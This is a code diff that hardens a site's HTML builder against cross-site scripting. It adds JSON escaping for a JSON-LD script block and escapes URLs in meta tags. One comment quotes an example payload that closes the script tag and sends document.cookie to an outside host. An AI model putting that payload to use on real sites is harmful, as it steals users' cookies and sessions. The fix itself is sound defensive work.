@@ -60,6 +60,45 @@ const BASE_URL = SEARCH_ORIGIN;
 
 const esc = (s: string) => (s || "").replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 
+/*
+ * JSON destined for a <script type="application/ld+json"> block.
+ *
+ * JSON.stringify alone is NOT safe here. It escapes what JSON needs escaped and
+ * nothing else, so `<` and `/` come through verbatim — a resume summary, post
+ * title or display name containing
+ *
+ *     </script><script>fetch('https://…?c='+document.cookie)</script>
+ *
+ * closes the block and runs on careervivid.app's own origin, with that origin's
+ * cookies and localStorage. The HTML parser looks for the literal characters
+ * `</script` before any JSON parsing happens, which is why the fix has to
+ * happen at the character level.
+ *
+ * esc() is the WRONG tool: it emits HTML entities, and `&lt;` inside a JSON
+ * string is just the four characters — the JSON-LD would be silently corrupted
+ * and every consumer would read the entity text as content. A JSON string can
+ * carry its own \uXXXX escapes instead, which the parser resolves back to the
+ * original character, so the payload survives intact while `</script` can never
+ * appear in the byte stream.
+ *
+ *   <, >   break out of the script block (and out of an HTML comment via `-->`)
+ *   &      cannot start an entity here, but escaping it costs nothing and keeps
+ *          the output inert if the block is ever moved to a parsed context
+ *   U+2028, U+2029  legal raw inside JSON, but line terminators to older JS
+ *                   parsers, which truncates the script
+ *
+ * Safe to chain: every replacement emits only [\\u0-9a-f], so no replacement
+ * can produce a character a later replacement would re-escape. Backslashes in
+ * the data were already doubled by JSON.stringify, so the sequences we add are
+ * unambiguously ours.
+ */
+export const escapeJsonForHtml = (data: unknown): string => JSON.stringify(data)
+    .replace(/</g, "\\u003c")
+    .replace(/>/g, "\\u003e")
+    .replace(/&/g, "\\u0026")
+    .replace(/\u2028/g, "\\u2028")
+    .replace(/\u2029/g, "\\u2029");
+
 const stripMarkdown = (md: string): string => (md || "")
     .replace(/```[\s\S]*?```/g, "")
     .replace(/!\[.*?\]\(.*?\)/g, "")
@@ -68,7 +107,7 @@ const stripMarkdown = (md: string): string => (md || "")
     .replace(/\n+/g, " ")
     .trim();
 
-const buildHtml = ({
+export const buildHtml = ({
     title, description, canonicalUrl, imageUrl, structuredData, bodyContent, siteSuffix, indexable = true
 }: {
     title: string; description: string; canonicalUrl: string; imageUrl: string;
@@ -81,16 +120,16 @@ const buildHtml = ({
   <title>${esc(title)}${siteSuffix ? ` | ${esc(siteSuffix)}` : ""}</title>
   <meta name="description" content="${esc(description)}" />
   <meta name="robots" content="${indexable ? "index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1" : "noindex, follow"}" />
-  <link rel="canonical" href="${canonicalUrl}" />
+  <link rel="canonical" href="${esc(canonicalUrl)}" />
   <link rel="icon" href="${LOGO_URL}" />
 
   <!-- Open Graph -->
   <meta property="og:type" content="website" />
-  <meta property="og:url" content="${canonicalUrl}" />
+  <meta property="og:url" content="${esc(canonicalUrl)}" />
   <meta property="og:site_name" content="CareerVivid" />
   <meta property="og:title" content="${esc(title)}" />
   <meta property="og:description" content="${esc(description)}" />
-  <meta property="og:image" content="${imageUrl}" />
+  <meta property="og:image" content="${esc(imageUrl)}" />
   <meta property="og:image:width" content="1200" />
   <meta property="og:image:height" content="630" />
 
@@ -98,10 +137,10 @@ const buildHtml = ({
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:title" content="${esc(title)}" />
   <meta name="twitter:description" content="${esc(description)}" />
-  <meta name="twitter:image" content="${imageUrl}" />
+  <meta name="twitter:image" content="${esc(imageUrl)}" />
 
   <!-- Structured Data -->
-  <script type="application/ld+json">${JSON.stringify(structuredData)}</script>
+  <script type="application/ld+json">${escapeJsonForHtml(structuredData)}</script>
 
 </head>
 <body>
